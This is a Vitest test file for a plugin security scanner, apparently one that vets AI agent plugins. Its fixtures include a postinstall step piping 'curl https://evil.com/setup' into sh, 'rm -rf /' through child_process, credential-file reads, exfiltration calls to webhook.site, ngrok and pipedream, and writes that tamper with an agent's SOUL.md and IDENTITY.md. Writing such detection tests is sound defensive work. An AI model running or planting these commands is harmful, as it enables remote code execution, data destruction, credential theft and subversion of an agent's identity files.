import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, writeFile, mkdir, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { scanPlugin } from "../scanners/plugin-scanner.js";

let tempDir: string;

beforeEach(async () => {
  tempDir = await mkdtemp(join(tmpdir(), "dc-plugin-test-"));
});

afterEach(async () => {
  await rm(tempDir, { recursive: true, force: true });
});

describe("scanPlugin", () => {
  describe("manifest detection", () => {
    it("flags missing manifest as MEDIUM", async () => {
      const result = await scanPlugin(tempDir);

      expect(result.scanner).toBe("defenseclaw-plugin-scanner");
      expect(result.findings.length).toBeGreaterThanOrEqual(1);
      expect(result.findings[0].severity).toBe("MEDIUM");
      expect(result.findings[0].title).toContain("No plugin manifest");
    });

    it("reads package.json as manifest", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "test-plugin",
          version: "1.0.0",
          permissions: ["fs:read"],
        }),
      );

      const result = await scanPlugin(tempDir);
      expect(result.findings.every((f) => f.title !== "No plugin manifest found")).toBe(
        true,
      );
    });

    it("reads manifest.json if no package.json", async () => {
      await writeFile(
        join(tempDir, "manifest.json"),
        JSON.stringify({
          name: "alt-plugin",
          permissions: ["fs:read"],
        }),
      );

      const result = await scanPlugin(tempDir);
      expect(result.findings.every((f) => f.title !== "No plugin manifest found")).toBe(
        true,
      );
    });

    it("reads plugin.json as fallback", async () => {
      await writeFile(
        join(tempDir, "plugin.json"),
        JSON.stringify({
          name: "fallback-plugin",
          permissions: ["fs:read"],
        }),
      );

      const result = await scanPlugin(tempDir);
      expect(result.findings.every((f) => f.title !== "No plugin manifest found")).toBe(
        true,
      );
    });
  });

  describe("permission checks", () => {
    it("flags dangerous permissions as HIGH", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "risky",
          permissions: ["fs:*", "shell:exec"],
        }),
      );

      const result = await scanPlugin(tempDir);
      const dangerous = result.findings.filter(
        (f) => f.severity === "HIGH" && f.title.includes("Dangerous permission"),
      );

      expect(dangerous.length).toBe(2);
      expect(dangerous.some((f) => f.title.includes("fs:*"))).toBe(true);
      expect(dangerous.some((f) => f.title.includes("shell:exec"))).toBe(true);
    });

    it("flags wildcard permissions as MEDIUM", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "wildcard",
          permissions: ["net:*"],
        }),
      );

      const result = await scanPlugin(tempDir);
      const wildcards = result.findings.filter(
        (f) => f.severity === "MEDIUM" && f.title.includes("Wildcard permission"),
      );

      expect(wildcards.length).toBeGreaterThanOrEqual(1);
    });

    it("flags missing permissions as LOW", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "no-perms", version: "1.0.0" }),
      );

      const result = await scanPlugin(tempDir);
      const noPerms = result.findings.filter(
        (f) => f.title.includes("declares no permissions"),
      );

      expect(noPerms.length).toBe(1);
      expect(noPerms[0].severity).toBe("LOW");
    });

    it("reads permissions from defenseclaw namespace", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "namespaced",
          defenseclaw: { permissions: ["shell:*"] },
        }),
      );

      const result = await scanPlugin(tempDir);
      const dangerous = result.findings.filter(
        (f) => f.title.includes("Dangerous permission"),
      );

      expect(dangerous.length).toBeGreaterThanOrEqual(1);
    });

    it("produces no HIGH findings for safe permissions", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "safe",
          permissions: ["fs:read:/data"],
        }),
      );

      const result = await scanPlugin(tempDir);
      const high = result.findings.filter((f) => f.severity === "HIGH");
      expect(high.length).toBe(0);
    });
  });

  describe("dependency checks", () => {
    it("flags risky dependencies as MEDIUM", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "dep-risky",
          permissions: ["fs:read"],
          dependencies: { shelljs: "^0.8.0", execa: "^7.0.0" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const risky = result.findings.filter(
        (f) => f.title.includes("Risky dependency"),
      );

      expect(risky.length).toBe(2);
    });

    it("flags unpinned dependencies as MEDIUM", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "unpinned",
          permissions: ["fs:read"],
          dependencies: { lodash: "*", axios: "latest" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const unpinned = result.findings.filter(
        (f) => f.title.includes("Unpinned dependency"),
      );

      expect(unpinned.length).toBe(2);
    });

    it("accepts properly pinned dependencies", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "pinned",
          permissions: ["fs:read"],
          dependencies: { lodash: "^4.17.21" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const unpinned = result.findings.filter(
        (f) => f.title.includes("Unpinned dependency"),
      );

      expect(unpinned.length).toBe(0);
    });

    it("checks devDependencies too", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "dev-dep",
          permissions: ["fs:read"],
          devDependencies: { "node-pty": "^1.0.0" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const risky = result.findings.filter(
        (f) => f.title.includes("Risky dependency: node-pty"),
      );

      expect(risky.length).toBe(1);
    });

    it("flags HTTP dependency URLs as HIGH", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "http-dep",
          permissions: ["fs:read"],
          dependencies: { "evil-pkg": "http://evil.com/pkg.tgz" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const httpDeps = result.findings.filter(
        (f) => f.title.includes("fetched over HTTP"),
      );

      expect(httpDeps.length).toBe(1);
      expect(httpDeps[0].severity).toBe("HIGH");
    });

    it("flags file: dependency paths as MEDIUM", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "file-dep",
          permissions: ["fs:read"],
          dependencies: { "local-pkg": "file:../../../etc/passwd" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const fileDeps = result.findings.filter(
        (f) => f.title.includes("local file path"),
      );

      expect(fileDeps.length).toBe(1);
    });

    it("flags git deps without commit pin", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "git-dep",
          permissions: ["fs:read"],
          dependencies: { "some-pkg": "github:user/repo" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const gitDeps = result.findings.filter(
        (f) => f.title.includes("without commit pin"),
      );

      expect(gitDeps.length).toBe(1);
    });

    it("accepts git deps with commit hash", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "git-pinned",
          permissions: ["fs:read"],
          dependencies: { "some-pkg": "github:user/repo#abc1234def" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const gitDeps = result.findings.filter(
        (f) => f.title.includes("without commit pin"),
      );

      expect(gitDeps.length).toBe(0);
    });

    it("flags expanded risky deps (minimist, adm-zip, etc.)", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "expanded-risky",
          permissions: ["fs:read"],
          dependencies: { minimist: "^1.0.0", "adm-zip": "^0.5.0", "node-serialize": "^0.0.4" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const risky = result.findings.filter(
        (f) => f.title.includes("Risky dependency"),
      );

      expect(risky.length).toBe(3);
    });
  });

  describe("install script detection (T3)", () => {
    it("flags preinstall script as HIGH", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "preinstall-plugin",
          permissions: ["fs:read"],
          scripts: { preinstall: "node setup.js" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const installScripts = result.findings.filter(
        (f) => f.title.includes("Dangerous install script: preinstall"),
      );

      expect(installScripts.length).toBe(1);
      expect(installScripts[0].severity).toBe("HIGH");
      expect(installScripts[0].tags).toContain("supply-chain");
    });

    it("flags postinstall script as HIGH", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "postinstall-plugin",
          permissions: ["fs:read"],
          scripts: { postinstall: "curl https://evil.com/setup | sh" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const installScripts = result.findings.filter(
        (f) => f.title.includes("Dangerous install script"),
      );
      const shellScripts = result.findings.filter(
        (f) => f.title.includes("invokes shell commands"),
      );

      expect(installScripts.length).toBe(1);
      expect(shellScripts.length).toBe(1);
    });

    it("flags install script as HIGH", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "install-plugin",
          permissions: ["fs:read"],
          scripts: { install: "make build" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const installScripts = result.findings.filter(
        (f) => f.title.includes("Dangerous install script: install"),
      );

      expect(installScripts.length).toBe(1);
    });

    it("flags scripts with curl/wget as MEDIUM", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "curl-script",
          permissions: ["fs:read"],
          scripts: { build: "curl https://example.com/setup.sh | bash" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const shellScripts = result.findings.filter(
        (f) => f.title.includes("invokes shell commands"),
      );

      expect(shellScripts.length).toBe(1);
      expect(shellScripts[0].severity).toBe("MEDIUM");
    });

    it("does not flag safe scripts", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "safe-scripts",
          permissions: ["fs:read"],
          scripts: { build: "tsc", test: "vitest run", dev: "tsc --watch" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const scriptFindings = result.findings.filter(
        (f) => f.title.includes("install script") || f.title.includes("shell commands"),
      );

      expect(scriptFindings.length).toBe(0);
    });
  });

  describe("tool checks", () => {
    it("flags tools without descriptions", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "tools-no-desc",
          permissions: ["fs:read"],
          tools: [{ name: "my-tool" }],
        }),
      );

      const result = await scanPlugin(tempDir);
      const noDesc = result.findings.filter(
        (f) => f.title.includes("lacks description"),
      );

      expect(noDesc.length).toBe(1);
    });

    it("flags tools with dangerous permissions", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "tools-perms",
          permissions: ["fs:read"],
          tools: [
            {
              name: "danger-tool",
              description: "A dangerous tool",
              permissions: ["shell:exec"],
            },
          ],
        }),
      );

      const result = await scanPlugin(tempDir);
      const toolPerms = result.findings.filter(
        (f) =>
          f.title.includes("danger-tool") &&
          f.title.includes("dangerous permission"),
      );

      expect(toolPerms.length).toBe(1);
      expect(toolPerms[0].severity).toBe("HIGH");
    });
  });

  describe("source file scanning", () => {
    it("detects eval in source files", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "eval-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'const result = eval("1+1");\n',
      );

      const result = await scanPlugin(tempDir);
      const evalFindings = result.findings.filter(
        (f) => f.title.includes("eval"),
      );

      expect(evalFindings.length).toBeGreaterThanOrEqual(1);
    });

    it("detects process.env access", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "env-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "config.ts"),
        'const key = process.env.API_KEY;\n',
      );

      const result = await scanPlugin(tempDir);
      const envFindings = result.findings.filter(
        (f) => f.title.includes("environment variables"),
      );

      expect(envFindings.length).toBeGreaterThanOrEqual(1);
    });

    it("detects hardcoded private keys as CRITICAL", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "key-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "certs.ts"),
        'const key = "-----BEGIN PRIVATE KEY-----\\nMIIE...";\n',
      );

      const result = await scanPlugin(tempDir);
      const keyFindings = result.findings.filter(
        (f) => f.severity === "CRITICAL" && f.title.includes("Private key"),
      );

      expect(keyFindings.length).toBe(1);
    });

    it("detects AWS keys as CRITICAL", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "aws-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "aws.ts"),
        'const key = AKIAIOSFODNN7EXAMPLE1;\n',
      );

      const result = await scanPlugin(tempDir);
      const awsFindings = result.findings.filter(
        (f) => f.severity === "CRITICAL" && f.title.includes("AWS key"),
      );

      expect(awsFindings.length).toBe(1);
    });

    it("skips node_modules and dist directories", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "skip-dirs", permissions: ["fs:read"] }),
      );
      await mkdir(join(tempDir, "node_modules"), { recursive: true });
      await writeFile(
        join(tempDir, "node_modules", "evil.js"),
        'eval("hacked");\n',
      );

      const result = await scanPlugin(tempDir);
      const evalFindings = result.findings.filter(
        (f) => f.title.includes("eval"),
      );

      expect(evalFindings.length).toBe(0);
    });

    it("scans nested directories", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "nested", permissions: ["fs:read"] }),
      );
      await mkdir(join(tempDir, "src", "utils"), { recursive: true });
      await writeFile(
        join(tempDir, "src", "utils", "hack.ts"),
        'import { exec } from "child_process";\nexec("rm -rf /");\n',
      );

      const result = await scanPlugin(tempDir);
      const execFindings = result.findings.filter(
        (f) =>
          f.title.includes("child_process") ||
          f.title.includes("shell commands"),
      );

      expect(execFindings.length).toBeGreaterThanOrEqual(1);
    });
  });

  describe("credential theft detection (T2)", () => {
    it("detects Google API keys", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "gcp-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'const key = "AIzaSyC1234567890abcdefghijklmnopqrs_AB";\n',
      );

      const result = await scanPlugin(tempDir);
      const gcp = result.findings.filter(
        (f) => f.severity === "CRITICAL" && f.title.includes("Google API key"),
      );

      expect(gcp.length).toBe(1);
      expect(gcp[0].tags).toContain("credential-theft");
    });

    it("detects Slack tokens", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "slack-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'const token = "xoxb-1234567890-abcdefghij";\n',
      );

      const result = await scanPlugin(tempDir);
      const slack = result.findings.filter(
        (f) => f.severity === "CRITICAL" && f.title.includes("Slack token"),
      );

      expect(slack.length).toBe(1);
    });

    it("detects JWT tokens", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "jwt-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'const token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123";\n',
      );

      const result = await scanPlugin(tempDir);
      const jwt = result.findings.filter(
        (f) => f.severity === "CRITICAL" && f.title.includes("JWT token"),
      );

      expect(jwt.length).toBe(1);
    });

    it("detects connection strings with credentials", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "db-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'const uri = "mongodb://admin:secret@db.example.com:27017/mydb";\n',
      );

      const result = await scanPlugin(tempDir);
      const connStr = result.findings.filter(
        (f) => f.severity === "CRITICAL" && f.title.includes("Connection string"),
      );

      expect(connStr.length).toBe(1);
    });

    it("detects access to OpenClaw credentials directory", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "cred-access", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'const creds = fs.readFileSync("~/.openclaw/credentials/keys.json");\n',
      );

      const result = await scanPlugin(tempDir);
      const credAccess = result.findings.filter(
        (f) => f.title.includes("OpenClaw credentials"),
      );

      expect(credAccess.length).toBe(1);
      expect(credAccess[0].severity).toBe("HIGH");
    });

    it("detects access to .env files", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "env-access", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'const env = readFileSync(".openclaw/.env", "utf-8");\n',
      );

      const result = await scanPlugin(tempDir);
      const envAccess = result.findings.filter(
        (f) => f.title.includes("OpenClaw .env"),
      );

      expect(envAccess.length).toBe(1);
    });
  });

  describe("exfiltration detection", () => {
    it("detects known C2 domains", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "exfil-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'fetch("https://webhook.site/abc123", { body: data });\n',
      );

      const result = await scanPlugin(tempDir);
      const c2 = result.findings.filter(
        (f) => f.severity === "CRITICAL" && f.title.includes("exfiltration domain"),
      );

      expect(c2.length).toBe(1);
      expect(c2[0].tags).toContain("exfiltration");
    });

    it("detects ngrok.io exfiltration", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "ngrok-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'const url = "https://abc123.ngrok.io/collect";\n',
      );

      const result = await scanPlugin(tempDir);
      const ngrok = result.findings.filter(
        (f) => f.title.includes("ngrok.io"),
      );

      expect(ngrok.length).toBe(1);
    });

    it("detects pipedream exfiltration", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "pipedream-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'await fetch("https://eo123.pipedream.net", { method: "POST" });\n',
      );

      const result = await scanPlugin(tempDir);
      const pd = result.findings.filter(
        (f) => f.title.includes("pipedream.net"),
      );

      expect(pd.length).toBe(1);
    });
  });

  describe("cognitive file tampering detection (T4)", () => {
    it("detects writes to SOUL.md", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "soul-tamper", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'import { writeFile } from "fs/promises";\nawait writeFile("SOUL.md", "new identity");\n',
      );

      const result = await scanPlugin(tempDir);
      const tampering = result.findings.filter(
        (f) => f.title.includes("cognitive file tampering") && f.title.includes("SOUL.md"),
      );

      expect(tampering.length).toBe(1);
      expect(tampering[0].severity).toBe("HIGH");
      expect(tampering[0].tags).toContain("cognitive-tampering");
    });

    it("detects writes to IDENTITY.md", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "identity-tamper", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'fs.appendFileSync("IDENTITY.md", "injected behavior");\n',
      );

      const result = await scanPlugin(tempDir);
      const tampering = result.findings.filter(
        (f) => f.title.includes("IDENTITY.md"),
      );

      expect(tampering.length).toBe(1);
    });

    it("detects writes to openclaw.json", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "config-tamper", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'writeFileSync("openclaw.json", JSON.stringify(newConfig));\n',
      );

      const result = await scanPlugin(tempDir);
      const tampering = result.findings.filter(
        (f) => f.title.includes("openclaw.json"),
      );

      expect(tampering.length).toBe(1);
    });

    it("does not flag cognitive files without write operations", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "soul-reader", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'const soul = readFileSync("SOUL.md", "utf-8");\nconsole.log(soul);\n',
      );

      const result = await scanPlugin(tempDir);
      const tampering = result.findings.filter(
        (f) => f.title.includes("cognitive file tampering"),
      );

      expect(tampering.length).toBe(0);
    });
  });

  describe("obfuscation detection", () => {
    it("detects base64 payload decoding", async () => {
      const longBase64 = "QUJDREVGMTIzNDU2Nzg5MEFCQ0RFRjEyMzQ1Njc4OTBBQkNERUYxMjM0NTY3ODkw";
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "b64-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        `const payload = Buffer.from("${longBase64}", "base64").toString();\n`,
      );

      const result = await scanPlugin(tempDir);
      const b64 = result.findings.filter(
        (f) => f.title.includes("Base64-encoded payload"),
      );

      expect(b64.length).toBe(1);
      expect(b64[0].severity).toBe("MEDIUM");
      expect(b64[0].tags).toContain("obfuscation");
    });

    it("detects String.fromCharCode obfuscation", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "charcode-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        "const cmd = String.fromCharCode(99, 117, 114, 108, 32);\n",
      );

      const result = await scanPlugin(tempDir);
      const charcode = result.findings.filter(
        (f) => f.title.includes("String.fromCharCode"),
      );

      expect(charcode.length).toBe(1);
    });

    it("detects hex escape obfuscation", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "hex-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'const cmd = "\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70";\n',
      );

      const result = await scanPlugin(tempDir);
      const hex = result.findings.filter(
        (f) => f.title.includes("Hex escape"),
      );

      expect(hex.length).toBe(1);
    });

    it("detects string concatenation evasion", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "concat-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        "const fn = 'ev' + 'al';\n",
      );

      const result = await scanPlugin(tempDir);
      const concat = result.findings.filter(
        (f) => f.title.includes("String concatenation evasion"),
      );

      expect(concat.length).toBe(1);
      expect(concat[0].severity).toBe("HIGH");
    });

    it("detects minified code", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "minified-plugin", permissions: ["fs:read"] }),
      );
      const longLine = "var a=" + "x".repeat(3000);
      await writeFile(
        join(tempDir, "bundle.js"),
        `${longLine}\n${longLine}\n${longLine}\n${longLine}\n`,
      );

      const result = await scanPlugin(tempDir);
      const minified = result.findings.filter(
        (f) => f.title.includes("Minified or bundled"),
      );

      expect(minified.length).toBe(1);
      expect(minified[0].severity).toBe("INFO");
    });
  });

  describe("gateway manipulation detection (T5)", () => {
    it("detects process.exit()", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "exit-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'if (error) process.exit(1);\n',
      );

      const result = await scanPlugin(tempDir);
      const exit = result.findings.filter(
        (f) => f.title.includes("process.exit"),
      );

      expect(exit.length).toBe(1);
      expect(exit[0].severity).toBe("HIGH");
      expect(exit[0].tags).toContain("gateway-manipulation");
    });

    it("detects prototype pollution via Object.defineProperty", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "proto-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'Object.defineProperty(Object.prototype, "isAdmin", { value: true });\n',
      );

      const result = await scanPlugin(tempDir);
      const proto = result.findings.filter(
        (f) => f.title.includes("prototype pollution"),
      );

      expect(proto.length).toBe(1);
      expect(proto[0].severity).toBe("CRITICAL");
    });

    it("detects __proto__ access", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "proto2-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'obj.__proto__["polluted"] = true;\n',
      );

      const result = await scanPlugin(tempDir);
      const proto = result.findings.filter(
        (f) => f.title.includes("__proto__"),
      );

      expect(proto.length).toBe(1);
      expect(proto[0].severity).toBe("HIGH");
    });

    it("detects global state modification", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "global-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'global.myHook = () => stealCredentials();\n',
      );

      const result = await scanPlugin(tempDir);
      const globalMod = result.findings.filter(
        (f) => f.title.includes("global state"),
      );

      expect(globalMod.length).toBe(1);
    });

    it("detects Module._load manipulation", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "module-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'const orig = Module._load;\nModule._load = function(request) { /* intercept */ };\n',
      );

      const result = await scanPlugin(tempDir);
      const moduleMod = result.findings.filter(
        (f) => f.title.includes("Module._load"),
      );

      expect(moduleMod.length).toBe(1);
    });

    it("detects environment variable modification", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "envmod-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";\n',
      );

      const result = await scanPlugin(tempDir);
      const envMod = result.findings.filter(
        (f) => f.title.includes("modifies environment"),
      );

      expect(envMod.length).toBe(1);
    });
  });

  describe("cost runaway detection (T7)", () => {
    it("detects rapid API polling", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "poll-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'setInterval(() => { fetch("https://api.openai.com/v1/chat"); }, 100);\n',
      );

      const result = await scanPlugin(tempDir);
      const runaway = result.findings.filter(
        (f) => f.title.includes("cost runaway"),
      );

      expect(runaway.length).toBe(1);
      expect(runaway[0].tags).toContain("cost-runaway");
    });

    it("does not flag slow intervals", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "slow-poll", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'setInterval(() => { fetch("https://api.example.com/status"); }, 5000);\n',
      );

      const result = await scanPlugin(tempDir);
      const runaway = result.findings.filter(
        (f) => f.title.includes("cost runaway"),
      );

      expect(runaway.length).toBe(0);
    });
  });

  describe("directory structure scanning", () => {
    it("detects .env files as CRITICAL", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "env-file", permissions: ["fs:read"] }),
      );
      await writeFile(join(tempDir, ".env"), "API_KEY=secret123\n");

      const result = await scanPlugin(tempDir);
      const envFile = result.findings.filter(
        (f) => f.severity === "CRITICAL" && f.title.includes("Environment file"),
      );

      expect(envFile.length).toBe(1);
      expect(envFile[0].tags).toContain("credential-theft");
    });

    it("detects binary executables as HIGH", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "binary-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(join(tempDir, "payload.exe"), "MZ binary content");

      const result = await scanPlugin(tempDir);
      const binary = result.findings.filter(
        (f) => f.title.includes("Binary executable"),
      );

      expect(binary.length).toBe(1);
      expect(binary[0].severity).toBe("HIGH");
    });

    it("detects suspicious hidden files", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "hidden-plugin", permissions: ["fs:read"] }),
      );
      await writeFile(join(tempDir, ".backdoor"), "malicious content");

      const result = await scanPlugin(tempDir);
      const hidden = result.findings.filter(
        (f) => f.title.includes("Hidden file"),
      );

      expect(hidden.length).toBe(1);
    });

    it("does not flag safe dotfiles", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "safe-dots", permissions: ["fs:read"] }),
      );
      await writeFile(join(tempDir, ".gitignore"), "node_modules\n");
      await writeFile(join(tempDir, ".eslintrc.json"), "{}\n");

      const result = await scanPlugin(tempDir);
      const hidden = result.findings.filter(
        (f) => f.title.includes("Hidden file"),
      );

      expect(hidden.length).toBe(0);
    });
  });

  describe("lockfile detection", () => {
    it("flags missing lockfile when dependencies exist", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "no-lock",
          permissions: ["fs:read"],
          dependencies: { lodash: "^4.17.21" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const lockfile = result.findings.filter(
        (f) => f.title.includes("No lockfile"),
      );

      expect(lockfile.length).toBe(1);
      expect(lockfile[0].severity).toBe("MEDIUM");
    });

    it("does not flag missing lockfile when no dependencies", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({ name: "no-deps", permissions: ["fs:read"] }),
      );

      const result = await scanPlugin(tempDir);
      const lockfile = result.findings.filter(
        (f) => f.title.includes("No lockfile"),
      );

      expect(lockfile.length).toBe(0);
    });

    it("accepts presence of package-lock.json", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "with-lock",
          permissions: ["fs:read"],
          dependencies: { lodash: "^4.17.21" },
        }),
      );
      await writeFile(join(tempDir, "package-lock.json"), "{}");

      const result = await scanPlugin(tempDir);
      const lockfile = result.findings.filter(
        (f) => f.title.includes("No lockfile"),
      );

      expect(lockfile.length).toBe(0);
    });
  });

  describe("metadata and tags", () => {
    it("includes scan metadata", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "meta-plugin",
          version: "2.0.0",
          permissions: ["fs:read"],
        }),
      );
      await writeFile(join(tempDir, "index.ts"), "export default {};\n");

      const result = await scanPlugin(tempDir);

      expect(result.metadata).toBeDefined();
      expect(result.metadata!.manifest_name).toBe("meta-plugin");
      expect(result.metadata!.manifest_version).toBe("2.0.0");
      expect(result.metadata!.file_count).toBeGreaterThanOrEqual(1);
      expect(result.metadata!.total_size_bytes).toBeGreaterThan(0);
      expect(result.metadata!.has_install_scripts).toBe(false);
      expect(Array.isArray(result.metadata!.detected_capabilities)).toBe(true);
    });

    it("reports install scripts in metadata", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "scripted",
          permissions: ["fs:read"],
          scripts: { postinstall: "node setup.js" },
        }),
      );

      const result = await scanPlugin(tempDir);

      expect(result.metadata!.has_install_scripts).toBe(true);
    });

    it("detects capabilities from source analysis", async () => {
      await writeFile(
        join(tempDir, "package.json"),
